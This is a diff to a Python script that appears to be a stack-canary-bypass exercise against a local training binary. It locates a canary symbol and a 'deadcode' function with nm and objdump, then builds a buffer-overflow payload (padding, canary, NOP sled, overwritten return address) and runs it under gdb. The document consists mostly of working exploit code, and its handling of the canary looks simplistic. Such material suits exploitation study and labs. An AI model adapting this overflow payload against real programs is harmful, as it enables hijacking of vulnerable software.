@@ -3,7 +3,6 @@ import os
 import struct
 import re
 
-# Define path to the vulnerable binary
 BINARY_PATH = "./vulnerable_binary"
 
 def analyze_binary(binary_path):
@@ -13,17 +12,18 @@ def analyze_binary(binary_path):
 
     canary_address = re.search(r'(\w+) B canary', nm_output)
     buffer_address = re.search(r'(\w+) <vulnerable_function>:', objdump_output)
+    deadcode_address = re.search(r'(\w+) <deadcode>:', objdump_output)
 
-    return canary_address.group(1), buffer_address.group(1)
+    return canary_address.group(1), buffer_address.group(1), deadcode_address.group(1)
 
-def create_payload(canary, return_address):
-    """Create payload to bypass stack canary and overwrite return address."""
-    buffer_size = 64  # Adjust buffer size as necessary
-    nop_slide = b"\x90" * 16  # NOP sled for controlled execution
+def create_payload(canary, deadcode_address):
+    """Create payload to jump to deadcode, bypassing the canary."""
+    buffer_size = 64  
+    nop_slide = b"\x90" * 16 
     payload = b"A" * buffer_size  # Fill buffer to overflow
-    payload += struct.pack("<I", canary)  # Pack the canary value
+    payload += struct.pack("<I", canary)  # Preserve the canary value
     payload += nop_slide
-    payload += struct.pack("<I", return_address)  # New return address
+    payload += struct.pack("<I", deadcode_address)  # jump to deadcode
     return payload
 
 def gdb_auto_run(binary_path, payload):
@@ -42,9 +42,9 @@ def gdb_auto_run(binary_path, payload):
     gdb_process.wait()
     print("Check gdb for output")
 
-def visualize_memory_layout(canary, return_address):
+def visualize_memory_layout(canary, deadcode_address):
     """Create a simple ASCII art visualization of the memory layout."""
-    print(f"Memory Layout:\nCanary at: {canary}\nReturn address at: {return_address}")
+    print(f"Memory Layout:\nCanary at: {canary}\nDeadcode at: {deadcode_address}")
 
 def test_payloads(payload_variants, binary_path):
     """Test multiple payloads to find a successful exploit."""
@@ -58,19 +58,14 @@ def test_payloads(payload_variants, binary_path):
 def main():
     print("Starting Stack Canary Bypass demonstration...")
 
-    # Extract addresses and values
-    canary, return_address = analyze_binary(BINARY_PATH)
+    canary, _, deadcode_address = analyze_binary(BINARY_PATH)
     canary = int(canary, 16)
-    return_address = int(return_address, 16) + 0x50  # Adjust this offset as needed
+    deadcode_address = int(deadcode_address, 16)
 
-    # Create the initial payload
-    payload = create_payload(canary, return_address)
+    payload = create_payload(canary, deadcode_address)
 
     # Visualize initial memory layout
-    visualize_memory_layout(canary, return_address)
-
-    # Interactive payload crafting (Optional)
-    # payload = interactive_exploit_session(payload)
+    visualize_memory_layout(canary, deadcode_address)
 
     # Test the payload
     test_payloads([payload], BINARY_PATH)
